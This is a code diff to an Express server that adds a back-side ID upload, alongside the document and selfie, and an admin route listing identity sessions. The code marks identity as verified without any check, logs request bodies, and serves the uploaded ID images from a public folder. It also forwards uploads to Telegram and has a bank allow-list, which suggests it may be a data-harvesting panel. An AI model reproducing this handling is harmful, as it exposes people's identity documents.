@@ -1019,36 +1019,51 @@ _Fecha: ${new Date().toLocaleString('es-MX')}_
   // Endpoint para subir documentos de identidad (documento + selfie)
   app.post('/api/upload-identity-files', upload.fields([
     { name: 'documentFile', maxCount: 1 },
+    { name: 'documentBackFile', maxCount: 1 },
     { name: 'selfieFile', maxCount: 1 }
   ]), async (req, res) => {
     try {
       const files = req.files as { [fieldname: string]: Express.Multer.File[] };
       const { sessionId, documentType } = req.body;
 
+      console.log('Files received:', Object.keys(files || {}));
+      console.log('Request body:', req.body);
+
       if (!sessionId) {
         return res.status(400).json({ message: "Session ID requerido" });
       }
 
       if (!files.documentFile || !files.selfieFile) {
-        return res.status(400).json({ message: "Se requieren ambos archivos: documento y selfie" });
+        return res.status(400).json({ message: "Se requieren archivos: documento frontal y selfie" });
       }
 
       const documentFile = files.documentFile[0];
+      const documentBackFile = files.documentBackFile ? files.documentBackFile[0] : null;
       const selfieFile = files.selfieFile[0];
 
       // Generar URLs de los archivos
       const documentFileUrl = `/uploads/${documentFile.filename}`;
+      const documentBackFileUrl = documentBackFile ? `/uploads/${documentBackFile.filename}` : null;
       const selfieFileUrl = `/uploads/${selfieFile.filename}`;
       
-      // Actualizar la sesión con la información de los archivos de identidad
-      const updatedSession = await storage.updateSession(sessionId, {
+      // Preparar datos de actualización
+      const updateData: any = {
         documentType: documentType,
         documentFileName: documentFile.originalname,
         documentFileUrl: documentFileUrl,
         selfieFileName: selfieFile.originalname,
         selfieFileUrl: selfieFileUrl,
         identityVerified: true
-      });
+      };
+
+      // Agregar archivo de respaldo si existe (para INE)
+      if (documentBackFile) {
+        updateData.documentBackFileName = documentBackFile.originalname;
+        updateData.documentBackFileUrl = documentBackFileUrl;
+      }
+      
+      // Actualizar la sesión con la información de los archivos de identidad
+      const updatedSession = await storage.updateSession(sessionId, updateData);
 
       console.log(`Documentos de identidad subidos para sesión ${sessionId}: ${documentType} + selfie`);
 
@@ -1073,7 +1088,7 @@ _Fecha: ${new Date().toLocaleString('es-MX')}_
         console.error('Error sending Telegram notification for identity documents:', notificationError);
       }
 
-      res.json({
+      const response: any = {
         success: true,
         documentFile: {
           fileName: documentFile.originalname,
@@ -1086,7 +1101,18 @@ _Fecha: ${new Date().toLocaleString('es-MX')}_
           fileSize: (selfieFile.size / (1024 * 1024)).toFixed(2) + ' MB'
         },
         documentType: documentType
-      });
+      };
+
+      // Agregar archivo de respaldo si existe
+      if (documentBackFile) {
+        response.documentBackFile = {
+          fileName: documentBackFile.originalname,
+          fileUrl: documentBackFileUrl,
+          fileSize: (documentBackFile.size / (1024 * 1024)).toFixed(2) + ' MB'
+        };
+      }
+
+      res.json(response);
     } catch (error) {
       console.error("Error uploading identity files:", error);
       res.status(500).json({ message: "Error al subir archivos de identidad" });
@@ -1095,6 +1121,30 @@ _Fecha: ${new Date().toLocaleString('es-MX')}_
 
   // Servir archivos estáticos desde la carpeta uploads
   app.use('/uploads', expressStatic(path.join(process.cwd(), 'uploads')));
+
+  // Endpoint para obtener sesiones con verificación de identidad
+  app.get('/api/admin/identity-sessions', async (req, res) => {
+    try {
+      if (!req.isAuthenticated()) {
+        return res.status(401).json({ message: "No autenticado" });
+      }
+
+      const currentUser = req.user;
+      
+      // Solo permitir a administradores ver las verificaciones de identidad
+      if (currentUser.role !== UserRole.ADMIN) {
+        return res.status(403).json({ message: "No autorizado" });
+      }
+
+      // Obtener todas las sesiones que tienen documentos de identidad
+      const sessions = await storage.getSessionsWithIdentityDocuments();
+      
+      res.json(sessions);
+    } catch (error: any) {
+      console.error('Error fetching identity sessions:', error);
+      res.status(500).json({ message: error.message });
+    }
+  });
 
   // Endpoint para obtener los bancos permitidos del usuario actual
   app.get('/api/user/allowed-banks', async (req, res) => {
